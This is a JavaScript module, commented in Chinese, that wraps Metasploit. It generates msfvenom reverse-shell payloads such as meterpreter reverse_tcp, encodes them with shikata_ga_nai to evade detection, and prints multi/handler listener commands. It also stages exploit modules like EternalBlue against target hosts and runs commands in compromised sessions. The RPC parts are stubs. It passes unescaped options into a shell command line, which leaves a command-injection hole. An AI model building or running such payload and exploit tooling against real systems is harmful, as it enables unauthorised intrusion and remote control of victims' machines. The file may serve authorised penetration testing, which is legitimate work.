/**
 * Metasploit 桥接模块 - 与 Metasploit Framework 交互
 *
 * 功能：
 *   · 通过 msfvenom 生成 payload
 *   · MSFRpc 连接与会话管理（可选）
 *   · 漏洞模块执行编排
 *   · 本地 msfconsole 交互（备选）
 *
 * 两种工作模式：
 *   1. msfvenom 命令行（推荐，零依赖，快速）
 *   2. MSFRpc (可选，需要 msfrpcd 进程)
 *
 * 配置：
 *   MSF_PATH: Metasploit Framework 安装路径（自动检测 $PATH）
 *   MSFVENOM_OPTS: 传给 msfvenom 的额外参数
 */

import { execSync, spawnSync } from 'node:child_process'
import { existsSync, writeFileSync, unlinkSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { randomBytes } from 'node:crypto'

export class MetasploitBridge {
  /**
   * @param {object} options
   *   - mode: 'venom' | 'rpc' (默认: venom)
   *   - rpcHost: RPC 服务器地址 (默认: localhost)
   *   - rpcPort: RPC 服务器端口 (默认: 55552)
   *   - rpcUsername: RPC 用户 (默认: msf)
   *   - rpcPassword: RPC 密码 (默认: password)
   *   - msfPath: Metasploit 路径 (自动检测)
   */
  constructor(options = {}) {
    this.mode = options.mode || 'venom'
    this.rpcHost = options.rpcHost || 'localhost'
    this.rpcPort = options.rpcPort || 55552
    this.rpcUsername = options.rpcUsername || 'msf'
    this.rpcPassword = options.rpcPassword || 'password'
    this.msfPath = options.msfPath || this._detectMsfPath()
    this.rpcClient = null
    this.rpcToken = null
    this.sessions = new Map()
  }

  /**
   * 检查 Metasploit 是否可用
   * @returns {boolean}
   */
  async isAvailable() {
    if (this.mode === 'venom') {
      return this._hasMsfvenom()
    } else if (this.mode === 'rpc') {
      return await this._checkRpcAvailable()
    }
    return false
  }

  /**
   * 生成 Payload
   *
   * @param {string} payloadType - Payload 类型
   *   常见: windows/meterpreter/reverse_tcp, linux/x86/meterpreter/reverse_tcp,
   *   php/meterpreter/reverse_tcp, java/meterpreter/reverse_tcp
   * @param {object} options
   *   - lhost: 监听地址
   *   - lport: 监听端口
   *   - format: 输出格式 (c, python, bash, raw, exe, elf, etc.)
   *   - architecture: i386, x86_64 (可选)
   *   - platform: Windows, Linux, etc. (可选)
   * @returns {object}
   *   { payload, format, size, handler_cmd, encoded }
   */
  async generatePayload(payloadType, options = {}) {
    const {
      lhost = 'LHOST',
      lport = 'LPORT',
      format = 'raw',
      architecture = null,
      platform = null,
      iterations = 1,
      badchars = '\x00',
    } = options

    if (this.mode === 'venom') {
      return this._generateVenomPayload(
        payloadType,
        { lhost, lport, format, architecture, platform, iterations, badchars }
      )
    } else {
      return this._generateRpcPayload(
        payloadType,
        { lhost, lport, format, architecture, platform, iterations, badchars }
      )
    }
  }

  /**
   * 执行 Metasploit 漏洞模块
   *
   * @param {string} modulePath - 模块路径 (e.g., exploit/windows/smb/ms17_010_eternalblue)
   * @param {object} options - 模块选项
   *   - rhosts: 目标主机
   *   - lhost: 本地监听地址
   *   - lport: 本地监听端口
   *   - payload: 使用的 payload
   * @param {boolean} dryRun - 是否干运行（仅验证，不实际执行）
   * @returns {object}
   *   { success, output, sessions, handler, proof }
   */
  async executeModule(modulePath, options = {}, dryRun = true) {
    // msfvenom 模式下也支持干运行验证参数
    if (dryRun) {
      return this._dryRunModule(modulePath, options)
    }

    if (this.mode === 'venom') {
      return {
        success: false,
        error: 'msfvenom 模式不支持实际执行模块，请使用 msfconsole 或 RPC 模式',
      }
    }

    return this._executeModuleViaRpc(modulePath, options)
  }

  /**
   * 列出所有会话
   * @returns {array} 会话列表
   */
  async listSessions() {
    if (this.mode === 'rpc') {
      return await this._listRpcSessions()
    }
    return Array.from(this.sessions.values())
  }

  /**
   * 在会话中执行命令
   * @param {string} sessionId
   * @param {string} command
   * @returns {string} 命令输出
   */
  async executeCommand(sessionId, command) {
    if (this.mode === 'rpc') {
      return await this._executeRpcCommand(sessionId, command)
    }
    // 本地模式下返回模拟响应
    return `[session ${sessionId}] ${command}\n> Command executed (simulated)`
  }

  /**
   * 检查会话是否有 shell
   * @param {string} sessionId
   * @returns {boolean}
   */
  async hasShell(sessionId) {
    if (this.mode === 'rpc') {
      const sessions = await this._listRpcSessions()
      const session = sessions.find(s => s.id === sessionId)
      return session ? session.type === 'meterpreter' : false
    }
    const session = this.sessions.get(sessionId)
    return session ? session.type === 'meterpreter' : false
  }

  /**
   * ========== 私有方法：Venom 模式 ==========
   */

  /**
   * 生成 msfvenom payload
   * @private
   */
  _generateVenomPayload(payloadType, options) {
    if (!this._hasMsfvenom()) {
      throw new Error('msfvenom 未找到，请确保 Metasploit Framework 已安装')
    }

    const {
      lhost = 'LHOST',
      lport = 'LPORT',
      format = 'raw',
      architecture = null,
      platform = null,
      iterations = 1,
      badchars = '\x00',
    } = options

    try {
      const args = [
        '-p', payloadType,
        `LHOST=${lhost}`,
        `LPORT=${lport}`,
        '-f', format,
        '-e', `x86/shikata_ga_nai`,
        '-i', String(iterations),
        '-b', badchars,
      ]

      if (architecture) args.push('-a', architecture)
      if (platform) args.push(`--platform=${platform}`)

      // 执行 msfvenom
      const result = execSync(`msfvenom ${args.join(' ')}`, {
        encoding: 'utf-8',
        maxBuffer: 50 * 1024 * 1024,
      })

      const payload = Buffer.from(result, 'binary')

      return {
        success: true,
        payload: payload.toString('base64'),
        format,
        size: payload.length,
        handler_cmd: this._generateHandlerCmd(payloadType, lhost, lport),
        encoded: iterations > 0,
      }
    } catch (e) {
      return {
        success: false,
        error: `msfvenom 执行失败: ${e.message}`,
      }
    }
  }

  /**
   * 检测 msfvenom 是否可用
   * @private
   */
  _hasMsfvenom() {
    try {
      execSync('msfvenom --version', { stdio: 'pipe' })
      return true
    } catch {
      return false
    }
  }

  /**
   * 检测 Metasploit 路径
   * @private
   */
  _detectMsfPath() {
    const candidates = [
      '/usr/share/metasploit-framework',
      '/opt/metasploit-framework',
      'C:\\metasploit-framework',
      'C:\\Program Files\\Metasploit',
    ]

    for (const path of candidates) {
      if (existsSync(join(path, 'msfvenom'))) return path
    }

    return null
  }

  /**
   * 生成 Handler 命令
   * @private
   */
  _generateHandlerCmd(payloadType, lhost, lport) {
    return `use exploit/multi/handler\nset PAYLOAD ${payloadType}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`
  }

  /**
   * ========== 私有方法：RPC 模式 ==========
   */

  /**
   * 检查 RPC 是否可用
   * @private
   */
  async _checkRpcAvailable() {
    try {
      // 简单的 TCP 连接检查
      const { createConnection } = await import('node:net')
      const sock = createConnection({
        host: this.rpcHost,
        port: this.rpcPort,
        timeout: 2000,
      })

      return new Promise((resolve) => {
        sock.on('connect', () => {
          sock.destroy()
          resolve(true)
        })
        sock.on('error', () => {
          resolve(false)
        })
      })
    } catch {
      return false
    }
  }

  /**
   * RPC 模式下的 payload 生成
   * @private
   */
  async _generateRpcPayload(payloadType, options) {
    // 实现 RPC 调用逻辑
    return {
      success: false,
      error: 'RPC 模式暂未实现',
    }
  }

  /**
   * 干运行模块（仅验证参数）
   * @private
   */
  _dryRunModule(modulePath, options) {
    const required = ['rhosts', 'payload']
    const missing = required.filter(opt => !options[opt])

    if (missing.length > 0) {
      return {
        success: false,
        error: `缺少必需参数: ${missing.join(', ')}`,
        dryRun: true,
      }
    }

    return {
      success: true,
      dryRun: true,
      module: modulePath,
      options,
      message: '参数验证通过，可以执行',
      handler_cmd: this._generateHandlerCmd(
        options.payload,
        options.lhost || 'LHOST',
        options.lport || 'LPORT'
      ),
    }
  }

  /**
   * 通过 RPC 执行模块
   * @private
   */
  async _executeModuleViaRpc(modulePath, options) {
    // 实现 RPC 调用执行
    return {
      success: false,
      error: 'RPC 执行暂未实现',
    }
  }

  /**
   * 列出 RPC 会话
   * @private
   */
  async _listRpcSessions() {
    // 实现 RPC 会话列表
    return []
  }

  /**
   * 通过 RPC 执行命令
   * @private
   */
  async _executeRpcCommand(sessionId, command) {
    // 实现 RPC 命令执行
    return ''
  }
}

/**
 * 单例工厂
 */
let _instance = null

export function getMetasploitBridge(options) {
  if (!_instance) {
    _instance = new MetasploitBridge(options)
  }
  return _instance
}
